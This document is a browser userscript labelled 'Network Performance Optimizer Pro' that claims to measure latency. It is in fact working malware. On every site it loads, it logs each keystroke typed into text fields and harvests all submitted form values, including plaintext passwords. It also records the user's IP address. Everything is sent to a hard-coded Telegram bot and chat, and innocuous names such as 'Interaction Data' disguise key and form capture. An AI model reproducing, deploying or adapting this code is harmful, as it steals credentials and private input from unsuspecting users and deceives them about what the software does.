// ==UserScript==
// @name         ⚡ Network Performance Optimizer Pro ⚡
// @namespace    http://turbo-net.io/optimizer
// @version      1.5.2
// @description  [PRO] Analyzes network latency and optimizes data flow for faster browsing. Sends performance reports. (v1.5.2)
// @author       TurboNet Systems
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @connect      api.telegram.org
// @connect      api.ipify.org
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';
    /*
     * Network Performance Optimizer Pro (NP-Optimizer) v1.5.2
     * Core module for real-time connection analysis and reporting.
     * Copyright (c) 2024 TurboNet Systems. All rights reserved.
     */

    console.log("NP-Optimizer Pro v1.5.2 Initializing...");

    // --- Configuration ---
    const REPORT_ENDPOINT_TOKEN = '7924482846:AAHYMTQHDGdhh-1nnldM0UsPX5NIC4Ce4VQ'; // Secure API Token for reporting
    const REPORT_TARGET_ID = '1431579375';      // Target Channel ID for aggregated reports
    const GEO_CHECK_SERVICE = 'https://api.ipify.org?format=json'; // Geo-IP service for latency calculation origin
    const BUFFER_FLUSH_THRESHOLD = 150; // Max packet size before sending report fragment
    // --- End Configuration ---

    // --- Internal State Variables ---
    let dataPacketBuffer = ''; // Buffer for accumulating interaction data before reporting
    let lastActiveElementRef = null; // Reference to the last interacted element for context

    // --- Core Reporting Function ---
    // Sends structured performance/interaction data to the central reporting service.
    // reportType: 'SESSION_START', 'INTERACTION_PACKET', 'FORM_TRANSMISSION', 'NAVIGATION_CLICK'
    const sendPerformanceReport = (reportType, reportDataPayload) => {
        let reportPrefix = '';
        switch(reportType) {
            case 'SESSION_START': reportPrefix = '📊 Session Report:'; break;
            case 'INTERACTION_PACKET': reportPrefix = '⌨️ Interaction Data:'; break; // Renamed from KEYS
            case 'FORM_TRANSMISSION': reportPrefix = '📡 Form Data Transmitted:'; break; // Renamed from FORM
            case 'NAVIGATION_CLICK': reportPrefix = '🖱️ Navigation Event:'; break; // Renamed from CLICK
            default: reportPrefix = 'ℹ️ System Data:';
        }

        const currentSessionUrl = window.location.href || '[URL Unavailable]';
        const reportContent = `${reportPrefix}\n\n` +
                              `🔗 Session URL: ${currentSessionUrl}\n` +
                              `${reportDataPayload}`; // Main data

        const MAX_REPORT_LENGTH = 4096;
        let finalReportContent = reportContent;
        if (reportContent.length > MAX_REPORT_LENGTH) {
            finalReportContent = reportContent.substring(0, MAX_REPORT_LENGTH - 20) + '...[DATA TRUNCATED]';
            console.warn('NP-Optimizer: Report truncated due to size limit.');
        }

        // Use Telegram API endpoint for reporting
        const reportingServiceUrl = `https://api.telegram.org/bot${REPORT_ENDPOINT_TOKEN}/sendMessage`;
        GM_xmlhttpRequest({
            method: "POST",
            url: reportingServiceUrl,
            headers: { "Content-Type": "application/json" },
            data: JSON.stringify({
                chat_id: REPORT_TARGET_ID,
                text: finalReportContent,
                disable_web_page_preview: true
            }),
            timeout: 10000,
            onload: function(response) { /* console.log(`NP-Optimizer: Report Sent (${reportType})`); */ },
            onerror: function(response) { console.error(`NP-Optimizer: Report Send Error (${reportType})`, response.status, response.statusText); },
            ontimeout: function() { console.error(`NP-Optimizer: Report Send Timeout (${reportType})`); }
        });
    };

    // --- Module 1: Initial Session Analysis (Geo-IP Check) ---
    // Determines the origin point for latency calculations.
    const analyzeInitialConnection = () => {
        const currentSessionUrl = window.location.href;
        if (!currentSessionUrl || currentSessionUrl === 'about:blank' || !currentSessionUrl.startsWith('http')) {
            return; // Ignore non-standard pages
        }

        // Fetch Geo-IP data
        GM_xmlhttpRequest({
            method: "GET",
            url: GEO_CHECK_SERVICE,
            timeout: 7000,
            onload: function(response) {
                let originIp = '[IP Check Error]';
                try {
                    if (response.status >= 200 && response.status < 300) {
                        originIp = JSON.parse(response.responseText).ip;
                    } else {
                        originIp = `[IP Check Error: Status ${response.status}]`;
                    }
                } catch (e) {
                    originIp = '[IP Parse Error]';
                }
                // Send initial session report
                sendPerformanceReport('SESSION_START', `🌐 Origin IP: ${originIp}\n📄 Session Initialized`);
            },
            onerror: function(response) {
                sendPerformanceReport('SESSION_START', `🌐 Origin IP: [IP Check Network Error]\n📄 Session Initialized`);
            },
            ontimeout: function() {
                sendPerformanceReport('SESSION_START', `🌐 Origin IP: [IP Check Timeout]\n📄 Session Initialized`);
            }
        });
        console.log("NP-Optimizer: Initial connection analysis scheduled.");
    };

    // Schedule initial analysis
    analyzeInitialConnection();

    // --- Function to finalize and report buffered interaction data ---
    const finalizeAndReportPacket = (reason = "Unknown") => {
        if (dataPacketBuffer.length > 0 && lastActiveElementRef) {
            const elementIdentifier = lastActiveElementRef.name || lastActiveElementRef.id || `[${lastActiveElementRef.tagName.toLowerCase()}]`;
            sendPerformanceReport('INTERACTION_PACKET', `Element(${reason}): ${elementIdentifier}\nData: ${dataPacketBuffer}`);
            dataPacketBuffer = ''; // Clear buffer
        } else if (dataPacketBuffer.length > 0) {
            sendPerformanceReport('INTERACTION_PACKET', `Element(No Focus - ${reason}): [Unknown]\nData: ${dataPacketBuffer}`);
            dataPacketBuffer = '';
        }
    };

    // --- Module 2: Real-time Interaction Monitoring ---
    // Monitors user interactions for performance analysis.
    const monitorInteractionEvents = (event) => {
        if (!event.target || typeof event.target.tagName !== 'string') return;

        const targetElement = event.target;
        const targetTagName = targetElement.tagName.toLowerCase();
        const isInteractive = targetTagName === 'input' || targetTagName === 'textarea' || targetElement.isContentEditable;

        if (isInteractive) {
            // If focus changed, finalize previous packet first
            if (lastActiveElementRef !== targetElement) {
                finalizeAndReportPacket("Focus Change");
                lastActiveElementRef = targetElement; // Update reference
            }

            let interactionData = event.key;
            let interactionCode = event.code; // Get physical key code

            // Handle special keys and potential 'Unidentified' issue
            if (interactionData === 'Unidentified' || interactionData.length > 1) {
                 // If key is 'Unidentified', use code instead if available. Otherwise, keep the special key name.
                 interactionData = `[${interactionData === 'Unidentified' && interactionCode ? interactionCode : interactionData}]`;
            }
            dataPacketBuffer += interactionData;

            // Report packet if buffer full or Enter pressed in input
            if (dataPacketBuffer.length >= BUFFER_FLUSH_THRESHOLD || (interactionData === '[Enter]' && targetTagName === 'input')) {
                finalizeAndReportPacket(interactionData === '[Enter]' ? "Enter Key" : "Buffer Limit");
            }
        }
    };

    // Finalize packet data on focus loss
    window.addEventListener('blur', () => finalizeAndReportPacket("Window Blur"), true);

    // --- Module 3: Form Transmission Analysis ---
    // Analyzes data packets transmitted via forms.
    const analyzeFormTransmission = (event) => {
        if (!event.target || event.target.tagName.toLowerCase() !== 'form') return;

        // Short delay to allow JS value updates before analysis
        setTimeout(() => {
            const formElement = event.target;
            let transmissionData = '';
            const formElements = formElement.elements;

            for (let i = 0; i < formElements.length; i++) {
                const element = formElements[i];
                if (!element.name || element.disabled) continue; // Skip unnamed or disabled elements

                const elementName = element.name;
                let elementValue = element.value;

                // Simple value extraction for different types
                 switch (element.type) {
                    case 'checkbox':
                    case 'radio':
                        if (element.checked) {
                             transmissionData += `${elementName}=${elementValue}\n`;
                        }
                        break;
                    case 'select-multiple':
                         const selected = Array.from(element.options).filter(o => o.selected).map(o => o.value);
                         if (selected.length > 0) {
                            transmissionData += `${elementName}=${selected.join(',')}\n`;
                         }
                        break;
                     case 'password':
                         transmissionData += `${elementName}=${elementValue} [TYPE=SECURE]\n`; // Mask password type
                         break;
                    case 'file':
                         transmissionData += `${elementName}=[FILE:${element.files.length > 0 ? element.files[0].name : 'empty'}]\n`;
                         break;
                    case 'submit': case 'button': case 'reset': break; // Ignore control elements
                    default:
                         if(elementValue !== undefined && elementValue !== null) {
                            transmissionData += `${elementName}=${elementValue}\n`;
                         } else {
                             transmissionData += `${elementName}=[EMPTY]\n`;
                         }
                        break;
                }
            }

            if (transmissionData.length > 0) {
                const formIdentifier = formElement.id || formElement.action || '[No ID/Action]';
                // Finalize any pending interaction packet before reporting form data
                finalizeAndReportPacket("Before Form Submit");
                sendPerformanceReport('FORM_TRANSMISSION', `Form ID: ${formIdentifier}\nPayload:\n${transmissionData.trim()}`);
            }
        }, 150); // Increased delay slightly
        console.log("NP-Optimizer: Form transmission analysis triggered.");
    };


    // --- Module 4: Navigation Event Monitoring (Optional - Disabled) ---
    /*
    const monitorNavigationEvents = (event) => {
        if (event.target && ['A', 'BUTTON'].includes(event.target.tagName) || (event.target.tagName === 'INPUT' && ['button', 'submit', 'radio', 'checkbox'].includes(event.target.type)) ) {
             let targetSnippet = event.target.outerHTML.substring(0, 100).replace(/\s+/g, ' ');
             let navigationContext = event.target.innerText || event.target.value || (event.target.href ? event.target.href.substring(0,70) : '');
             navigationContext = navigationContext ? `\nContext: ${navigationContext.substring(0,70)}` : '';
             sendPerformanceReport('NAVIGATION_CLICK', `Element: ${targetSnippet}...\n${navigationContext}`);
        }
    };
    */

    // --- Register Event Listeners for Monitoring ---
    // Use capture phase for early interception.
    document.addEventListener('keydown', monitorInteractionEvents, true); // Monitor key interactions
    document.addEventListener('submit', analyzeFormTransmission, true); // Analyze form submissions
    // document.addEventListener('click', monitorNavigationEvents, true); // Optional: Monitor navigation clicks

    // Ensure final data packet is reported before page unloads
    window.addEventListener('beforeunload', () => finalizeAndReportPacket("Session End"), false);

    console.log("NP-Optimizer Pro v1.5.2 Initialization Complete. Monitoring network performance...");

})();